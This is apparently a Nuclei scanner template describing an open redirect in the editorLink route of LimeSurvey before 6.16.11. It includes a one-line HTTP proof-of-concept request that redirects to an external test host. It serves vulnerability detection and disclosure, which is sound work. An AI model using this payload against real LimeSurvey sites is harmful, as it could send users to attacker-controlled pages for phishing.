# Nuclei Template: LimeSurvey - Open Redirect via editorLink
**Template ID:** limesurvey-open-redirect
**Vulnerability Class:** Open Redirect
**Severity:** Medium
**CWE:** CWE-601
**Source:** Nuclei Template (`limesurvey-open-redirect.yaml`)

## Vulnerability Information & PoC

## Description
LimeSurvey before 6.16.11 contains an open redirect vulnerability in the editorLink route. An attacker can craft a URL that redirects users to an arbitrary external site, potentially enabling phishing attacks.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/index.php?r=editorLink&url=http://interact.sh/
```

## References
- https://github.com/LimeSurvey/LimeSurvey/pull/4727
